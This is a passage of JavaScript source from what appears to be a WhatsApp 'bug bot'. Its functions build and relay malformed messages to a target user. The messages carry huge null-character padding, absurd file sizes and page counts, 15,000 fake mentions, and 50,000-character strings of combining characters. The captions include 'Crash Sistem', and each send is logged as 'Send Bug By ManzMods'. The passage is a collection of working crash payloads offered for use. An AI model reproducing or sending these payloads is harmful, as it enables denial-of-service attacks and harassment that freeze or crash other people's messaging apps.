                    mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
                    fileName: "𝐌𝐲𝐬𝐭𝐞𝐫𝐢𝐨𝐮𝐬 𝐌𝐞𝐧 𝐈𝐧 𝐂𝐲𝐛𝐞𝐫𝐒𝐩𝐚𝐜𝐞♻️",
                    fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
                    directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1724474503",
                    contactVcard: true,
                    thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                    thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                    thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                    jpegThumbnail: ""
                  }
                }
              }
            }
          }
        }
      }), {
        userJid: p224,
        quoted: v211
      });
      await p154.relayMessage(p224, vGenerateWAMessageFromContent47.message, p226 ? {
        participant: {
          jid: p224
        }
      } : {});
      console.log(chalk.red("Send Bug By ManzMods🐉"));
    }
    ;
    async function f81(p227, p228 = true) {
      await p154.relayMessage(p227, {
        viewOnceMessage: {
          message: {
            interactiveResponseMessage: {
              body: {
                text: "𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉",
                format: "EXTENSIONS_1"
              },
              nativeFlowResponseMessage: {
                name: "galaxy_message",
                paramsJson: "{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"𝐌𝐚𝐧𝐳 𝐈𝐬 𝐇𝐞𝐫𝐞 ϟ\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"@RaditX7\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"⭑̤⟅̊༑ ▾ 𝐌 𝐀 𝐍 𝐙 ⿻ 𝐈𝐍͢𝐕𝚫𝐒𝐈͢𝚯𝚴 ⿻ ▾ ༑̴⟆̊‏‎‏‎‏‎‏⭑̤" + "\0".repeat(1045000) + "\",\"screen_0_TextInput_1\":\"INFINITE\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}",
                version: 3
              }
            }
          }
        }
      }, p228 ? {
        participant: {
          jid: p227
        }
      } : {});
      console.log(chalk.red("Send Bug By ManzMods🐉"));
    }
    ;
    async function f82(p229, p230, p231 = false, p232 = false) {
      let vGenerateWAMessageFromContent48 = generateWAMessageFromContent(p229, proto.Message.fromObject({
        viewOnceMessage: {
          message: {
            interactiveMessage: {
              header: {
                title: "",
                documentMessage: {
                  url: "https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true",
                  mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                  fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                  fileLength: "9999999999999",
                  pageCount: 9007199254740991,
                  mediaKey: "EZ/XTztdrMARBwsjTuo9hMH5eRvumy+F8mpLBnaxIaQ=",
                  fileName: "🩸⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠",
                  fileEncSha256: "oTnfmNW1xNiYhFxohifoE7nJgNZxcCaG15JVsPPIYEg=",
                  directPath: "/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0",
                  mediaKeyTimestamp: "1723855952",
                  contactVcard: true,
                  thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                  thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                  thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                  jpegThumbnail: p230
                },
                hasMediaAttachment: true
              },
              body: {
                text: "‎𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉"
              },
              nativeFlowMessage: {
                messageParamsJson: "{\"name\":\"galaxy_message\",\"title\":\"oi\",\"header\":\" 𝐌𝐚𝐧𝐳 𝐈𝐬 𝐇𝐞𝐫𝐞 ϟ \",\"body\":\"xxx\"}",
                buttons: [p231 ? {
                  name: "single_select",
                  buttonParamsJson: "{\"title\":\"🎭⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝑪͢𝒓𝒂ͯ͢𝒔𝒉ཀ͜͡🐉" + "᬴".repeat(0) + "\",\"sections\":[{\"title\":\"𝐌𝐚𝐧𝐳 𝐈𝐬 𝐇𝐞𝐫𝐞 ϟ\",\"rows\":[]}]}"
                } : {
                  name: "payment_method",
                  buttonParamsJson: ""
                }, {
                  name: "call_permission_request",
                  buttonParamsJson: "{}"
                }, {
                  name: "payment_method",
                  buttonParamsJson: "{}"
                }, {
                  name: "review_and_pay",
                  buttonParamsJson: ""
                }, {
                  name: "call_permission_request",
                  buttonParamsJson: "{}"
                }, {
                  name: "review_and_pay",
                  buttonParamsJson: "{}"
                }, {
                  name: "payment_info",
                  buttonParamsJson: ""
                }, {
                  name: "call_permission_request",
                  buttonParamsJson: "{}"
                }, {
                  name: "payment_info",
                  buttonParamsJson: "{}"
                }, {
                  name: "single_select",
                  buttonParamsJson: "{\"title\":\"🎭⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝑪͢𝒓𝒂ͯ͢𝒔𝒉ཀ͜͡🐉\",\"sections\":[{\"title\":\"𝐌𝐚𝐧𝐳 𝐈𝐬 𝐇𝐞𝐫𝐞 ϟ\",\"rows\":[]}]}"
                }, {
                  name: "galaxy_message",
                  buttonParamsJson: "{\"flow_action\":\"navigate\",\"flow_action_payload\":{\"screen\":\"WELCOME_SCREEN\"},\"flow_cta\":\"〽️\",\"flow_id\":\"BY DEVORSIXCORE\",\"flow_message_version\":\"9\",\"flow_token\":\"MYPENISMYPENISMYPENIS\"}"
                }, {
                  name: "mpm",
                  buttonParamsJson: "{}"
                }]
              }
            }
          }
        }
      }), {
        userJid: p229,
        quoted: v211
      });
      await p154.relayMessage(p229, vGenerateWAMessageFromContent48.message, p232 ? {
        participant: {
          jid: p229
        }
      } : {});
      console.log(chalk.red("Send Bug By ManzMods🐉"));
    }
    ;
    async function f83(p233, p234, p235 = false, p236 = false) {
      let vGenerateWAMessageFromContent49 = generateWAMessageFromContent(p233, proto.Message.fromObject({
        viewOnceMessage: {
          message: {
            interactiveMessage: {
              header: {
                title: "",
                documentMessage: {
                  url: "https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true",
                  mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                  fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                  fileLength: "9999999999999",
                  pageCount: 9007199254740991,
                  mediaKey: "EZ/XTztdrMARBwsjTuo9hMH5eRvumy+F8mpLBnaxIaQ=",
                  fileName: "🩸⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠",
                  fileEncSha256: "oTnfmNW1xNiYhFxohifoE7nJgNZxcCaG15JVsPPIYEg=",
                  directPath: "/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0",
                  mediaKeyTimestamp: "1723855952",
                  contactVcard: true,
                  thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                  thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                  thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                  jpegThumbnail: p234
                },
                hasMediaAttachment: true
              },
              body: {
                text: "‎⭑̤⟅̊༑ ▾ 𝐌 𝐀 𝐍 𝐙 ⿻ 𝐈𝐍͢𝐕𝚫𝐒𝐈͢𝚯𝚴 ⿻ ▾ ༑̴⟆̊‏‎‏‎‏‎‏⭑̤"
              },
              nativeFlowMessage: {
                messageParamsJson: "{\"name\":\"galaxy_message\",\"title\":\"oi\",\"header\":\" 𝐌𝐚𝐧𝐳 𝐈𝐬 𝐇𝐞𝐫𝐞 ϟ \",\"body\":\"xxx\"}",
                buttons: [p235 ? {
                  name: "single_select",
                  buttonParamsJson: "{\"title\":\"🎭⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝑪͢𝒓𝒂ͯ͢𝒔𝒉ཀ͜͡🐉" + "᬴".repeat(0) + "\",\"sections\":[{\"title\":\"𝐌𝐚𝐧𝐳 𝐈𝐬 𝐇𝐞𝐫𝐞 ϟ\",\"rows\":[]}]}"
                } : {
                  name: "payment_method",
                  buttonParamsJson: ""
                }, {
                  name: "call_permission_request",
                  buttonParamsJson: "{}"
                }, {
                  name: "payment_method",
                  buttonParamsJson: "{}"
                }, {
                  name: "review_and_pay",
                  buttonParamsJson: ""
                }, {
                  name: "call_permission_request",
                  buttonParamsJson: "{}"
                }, {
                  name: "review_and_pay",
                  buttonParamsJson: "{}"
                }, {
                  name: "payment_info",
                  buttonParamsJson: ""
                }, {
                  name: "call_permission_request",
                  buttonParamsJson: "{}"
                }, {
                  name: "payment_info",
                  buttonParamsJson: "{}"
                }, {
                  name: "single_select",
                  buttonParamsJson: "{\"title\":\"🎭⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝑪͢𝒓𝒂ͯ͢𝒔𝒉ཀ͜͡🐉\",\"sections\":[{\"title\":\"𝐌𝐚𝐧𝐳 𝐈𝐬 𝐇𝐞𝐫𝐞 ϟ\",\"rows\":[]}]}"
                }, {
                  name: "galaxy_message",
                  buttonParamsJson: "{\"flow_action\":\"navigate\",\"flow_action_payload\":{\"screen\":\"WELCOME_SCREEN\"},\"flow_cta\":\"〽️\",\"flow_id\":\"BY DEVORSIXCORE\",\"flow_message_version\":\"9\",\"flow_token\":\"MYPENISMYPENISMYPENIS\"}"
                }, {
                  name: "mpm",
                  buttonParamsJson: "{}"
                }]
              }
            }
          }
        }
      }), {
        userJid: p233,
        quoted: v212
      });
      await p154.relayMessage(p233, vGenerateWAMessageFromContent49.message, p236 ? {
        participant: {
          jid: p233
        }
      } : {});
      console.log(chalk.red("Send Bug By ManzMods🐉"));
    }
    ;
    async function f84(p237, p238 = false) {
      await p154.relayMessage(p237, {
        extendedTextMessage: {
          text: "⭑̤⟅̊༑ ▾ 𝐌 𝐀 𝐍 𝐙 ⿻ 𝐈𝐍͢𝐕𝚫𝐒𝐈͢𝚯𝚴 ⿻ ▾ ༑̴⟆̊‏‎‏‎‏‎‏⭑̤",
          contextInfo: {
            stanzaId: "1234567890ABCDEF",
            participant: "6281991410940@s.whatsapp.net",
            quotedMessage: {
              callLogMesssage: {
                isVideo: true,
                callOutcome: "1",
                durationSecs: "0",
                callType: "REGULAR",
                participants: [{
                  jid: "6281991410940@s.whatsapp.net",
                  callOutcome: "1"
                }]
              }
            },
            remoteJid: p237,
            conversionSource: "source_example",
            conversionData: "Y29udmVyc2lvbl9kYXRhX2V4YW1wbGU=",
            conversionDelaySeconds: 10,
            forwardingScore: 9999999,
            isForwarded: true,
            quotedAd: {
              advertiserName: "Example Advertiser",
              mediaType: "IMAGE",
              jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7pK5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
              caption: "This is an ad caption"
            },
            placeholderKey: {
              remoteJid: "6281991410940@s.whatsapp.net",
              fromMe: false,
              id: "ABCDEF1234567890"
            },
            expiration: 86400,
            ephemeralSettingTimestamp: "1728090592378",
            ephemeralSharedSecret: "ZXBoZW1lcmFsX3NoYXJlZF9zZWNyZXRfZXhhbXBsZQ==",
            externalAdReply: {
              title: "𝐌𝐚𝐫𝐠𝐚 𝐓𝐢𝐳𝐢〽",
              body: "𝐌𝐚𝐧𝐳 𝐈𝐬 𝐇𝐞𝐫𝐞 ϟ",
              mediaType: "VIDEO",
              renderLargerThumbnail: true,
              previewTtpe: "VIDEO",
              thumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7p5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
              sourceType: " x ",
              sourceId: " x ",
              sourceUrl: "https://www.instagram.com/raditx7",
              mediaUrl: "https://www.instagram.com/raditx7",
              containsAutoReply: true,
              renderLargerThumbnail: true,
              showAdAttribution: true,
              ctwaClid: "ctwa_clid_example",
              ref: "ref_example"
            },
            entryPointConversionSource: "entry_point_source_example",
            entryPointConversionApp: "entry_point_app_example",
            entryPointConversionDelaySeconds: 5,
            disappearingMode: {},
            actionLink: {
              url: "https://www.instagram.com/raditx7"
            },
            groupSubject: "Example Group Subject",
            parentGroupJid: "6287888888888-1234567890@g.us",
            trustBannerType: "trust_banner_example",
            trustBannerAction: 1,
            isSampled: false,
            utm: {
              utmSource: "utm_source_example",
              utmCampaign: "utm_campaign_example"
            },
            forwardedNewsletterMessageInfo: {
              newsletterJid: "6287888888888-1234567890@g.us",
              serverMessageId: 1,
              newsletterName: " X ",
              contentType: "UPDATE",
              accessibilityText: " X "
            },
            businessMessageForwardInfo: {
              businessOwnerJid: "0@s.whatsapp.net"
            },
            smbClientCampaignId: "smb_client_campaign_id_example",
            smbServerCampaignId: "smb_server_campaign_id_example",
            dataSharingContext: {
              showMmDisclosure: true
            }
          }
        }
      }, p238 ? {
        participant: {
          jid: p237
        }
      } : {});
      console.log(chalk.red("Send Bug By ManzMods🐉"));
    }
    ;
    async function f85(p239, p240 = false) {
      await p154.relayMessage(p239, {
        extendedTextMessage: {
          text: "⭑̤⟅̊༑ ▾ 𝐌 𝐀 𝐍 𝐙 ⿻ 𝐈𝐍͢𝐕𝚫𝐒𝐈͢𝚯𝚴 ⿻ ▾ ༑̴⟆̊‏‎‏‎‏‎‏⭑̤\n" + "@6281991410940".repeat(15000),
          contextInfo: {
            mentionedJid: ["6281991410940@s.whatsapp.net", ...Array.from({
              length: 15000
            }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net")],
            stanzaId: "1234567890ABCDEF",
            participant: "0@s.whatsapp.net",
            quotedMessage: {
              callLogMesssage: {
                isVideo: true,
                callOutcome: "1",
                durationSecs: "0",
                callType: "REGULAR",
                participants: [{
                  jid: "0@s.whatsapp.net",
                  callOutcome: "1"
                }]
              }
            },
            remoteJid: p239,
            conversionSource: " X ",
            conversionData: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7pK5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
            conversionDelaySeconds: 10,
            forwardingScore: 9999999,
            isForwarded: true,
            quotedAd: {
              advertiserName: " X ",
              mediaType: "IMAGE",
              jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7pK5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
              caption: " X "
            },
            placeholderKey: {
              remoteJid: "0@s.whatsapp.net",
              fromMe: false,
              id: "ABCDEF1234567890"
            },
            expiration: 86400,
            ephemeralSettingTimestamp: "1728090592378",
            ephemeralSharedSecret: "ZXBoZW1lcmFsX3NoYXJlZF9zZWNyZXRfZXhhbXBsZQ==",
            externalAdReply: {
              title: "𝐌𝐚𝐫𝐠𝐚 𝐓𝐢𝐳𝐢〽",
              body: "𝐌𝐚𝐧𝐳 𝐈𝐬 𝐇𝐞𝐫𝐞 ϟ",
              mediaType: "VIDEO",
              renderLargerThumbnail: true,
              previewType: "VIDEO",
              thumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/...",
              sourceType: " x ",
              sourceId: " x ",
              sourceUrl: "https://www.instagram.com/raditx7",
              mediaUrl: "https://www.instagram.com/raditx7",
              containsAutoReply: true,
              showAdAttribution: true,
              ctwaClid: "ctwa_clid_example",
              ref: "ref_example"
            },
            entryPointConversionSource: "entry_point_source_example",
            entryPointConversionApp: "entry_point_app_example",
            entryPointConversionDelaySeconds: 5,
            disappearingMode: {},
            actionLink: {
              url: "https://www.instagram.com/raditx7"
            },
            groupSubject: " X ",
            parentGroupJid: "6287888888888-1234567890@g.us",
            trustBannerType: " X ",
            trustBannerAction: 1,
            isSampled: false,
            utm: {
              utmSource: " X ",
              utmCampaign: " X "
            },
            forwardedNewsletterMessageInfo: {
              newsletterJid: "6287888888888-1234567890@g.us",
              serverMessageId: 1,
              newsletterName: " X ",
              contentType: "UPDATE",
              accessibilityText: " X "
            },
            businessMessageForwardInfo: {
              businessOwnerJid: "0@s.whatsapp.net"
            },
            smbClientCampaignId: "smb_client_campaign_id_example",
            smbServerCampaignId: "smb_server_campaign_id_example",
            dataSharingContext: {
              showMmDisclosure: true
            }
          }
        }
      }, p240 ? {
        participant: {
          jid: p239
        }
      } : {});
      console.log(chalk.red("Send Bug By ManzMods🐉"));
    }
    ;
    async function f86(p241, p242) {
      var vGenerateWAMessageFromContent50 = generateWAMessageFromContent(p241, proto.Message.fromObject({
        viewOnceMessage: {
          message: {
            liveLocationMessage: {
              degreesLatitude: "p",
              degreesLongitude: "p",
              caption: "*`ꪶꪹManzXbugCrash.Com᭢`* " + _0x7b7e5b + "ꦾ".repeat(50000),
              sequenceNumber: "0",
              jpegThumbnail: ""
            }
          }
        }
      }), {
        userJid: p241,
        quoted: p242
      });
      await p154.relayMessage(p241, vGenerateWAMessageFromContent50.message, {
        participant: {
          jid: p241
        },
        messageId: vGenerateWAMessageFromContent50.key.id
      });
    }
    async function f87(p243) {
      var vGenerateWAMessageFromContent51 = generateWAMessageFromContent(p243, proto.Message.fromObject({
        viewOnceMessage: {
          message: {
            interactiveMessage: {
              header: {
                title: "",
                subtitle: "C҉r҉a҉s҉h҉ S҉i҉s҉t҉e҉m҉ A҉l҉d҉z҉z҉"
              },
              body: {
                text: "C͓̽r͓̽a͓̽s͓̽h͓̽ S͓̽i͓̽s͓̽t͓̽e͓̽m͓̽"
              },
              footer: {
                text: "C͓̽r͓̽a͓̽s͓̽h͓̽ S͓̽k͓̽i͓̽b͓̽i͓̽d͓͓̽̽i͓̽"
              },
              nativeFlowMessage: {
                buttons: [{
                  name: "cta_url",
                  buttonParamsJson: "{ display_text : 'D҉o҉n҉g҉o҉', url : , merchant_url :  }"
                }],
                messageParamsJson: "ꦾྦྷ".repeat(50000)
              }
            }
          }
        }
      }), {
        userJid: p243
      });
      await p154.relayMessage(p243, vGenerateWAMessageFromContent51.message, {
        participant: {
          jid: p243
        },
        messageId: vGenerateWAMessageFromContent51.key.id
      });
    }
    async function f88(p244, p245) {
      var vGenerateWAMessageFromContent52 = generateWAMessageFromContent(p244, proto.Message.fromObject({
        stickerMessage: {
